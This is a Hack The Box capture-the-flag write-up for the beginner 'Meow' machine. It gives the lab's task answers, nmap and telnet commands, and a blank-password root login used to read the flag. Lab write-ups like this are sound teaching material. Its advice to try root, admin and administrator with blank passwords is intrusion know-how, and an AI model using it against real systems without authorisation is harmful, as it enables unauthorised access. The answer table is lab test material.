# HTB — Meow Writeup
**Platform:** Hack The Box  
**Track:** Starting Point — Tier 0  
**Difficulty:** Very Easy  
**OS:** Linux  
**Service:** Telnet (Port 23)

---

## Overview

Meow is the first introductory machine in HTB's Starting Point track. The goal is to get comfortable with the HTB environment, practice basic enumeration, and exploit a misconfigured Telnet service running with no root password.

---

## Task Answers (Quick Reference)

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the acronym VM stand for? | Virtual Machine |
| 2 | What tool do we use to interact with the OS via command line? | terminal |
| 3 | What service do we use to form our VPN connection into HTB labs? | openvpn |
| 4 | What is the abbreviated name for a 'tunnel interface'? | tun |
| 5 | What tool do we use to test our connection to the target? | ping |
| 6 | What is the name of the tool we use to scan the target's ports? | nmap |
| 7 | What service do we find running on the open port? | telnet |
| 8 | What username ultimately works with the telnet login? | root |
| 9 | Submit root flag | *(found via `cat flag.txt`)* |

---

## Enumeration

### Ping the target
Confirm connectivity after spawning the machine and connecting via VPN or Pwnbox:

```bash
ping -c 4 <TARGET_IP>
```

### Nmap scan
Scan all ports to identify open services:

```bash
sudo nmap -sCV -p- --min-rate=1000 -oA meow <TARGET_IP>
```

**Key result:**
```
23/tcp  open  telnet  Linux telnetd
```

Port 23 (Telnet) is open — a notoriously insecure protocol that transmits data in plaintext.

---

## Exploitation

### Connect via Telnet

```bash
telnet <TARGET_IP>
```

You'll be greeted with a login prompt. Try common default credentials:

| Username | Password | Result |
|----------|----------|--------|
| admin | (blank) | ❌ |
| administrator | (blank) | ❌ |
| root | (blank) | ✅ |

### Login as root with a blank password

```
Meow login: root
(press Enter — no password)
```

You're in as root.

---

## Flag

```bash
ls
cat flag.txt
```

Copy the flag value and submit it on the HTB portal.

---

## Key Takeaways

- **VPN setup**: HTB requires either Pwnbox (browser VM) or OpenVPN (`sudo openvpn starting_point_*.ovpn`) to reach lab machines.
- **Enumeration**: Always start with `nmap` to discover open ports and services.
- **Telnet is insecure**: It transmits everything in plaintext and may allow login with no credentials — never use it in production.
- **Default credentials**: Always try `root`, `admin`, `administrator` with blank passwords on misconfigured services.

---

## Commands Cheatsheet

```bash
# Connect to HTB via VPN
sudo openvpn starting_point_<username>.ovpn

# Verify connectivity
ping -c 4 <TARGET_IP>

# Full port scan
sudo nmap -sCV -p- --min-rate=1000 -oA meow <TARGET_IP>

# Connect via Telnet
telnet <TARGET_IP>

# After login as root
ls
cat flag.txt
```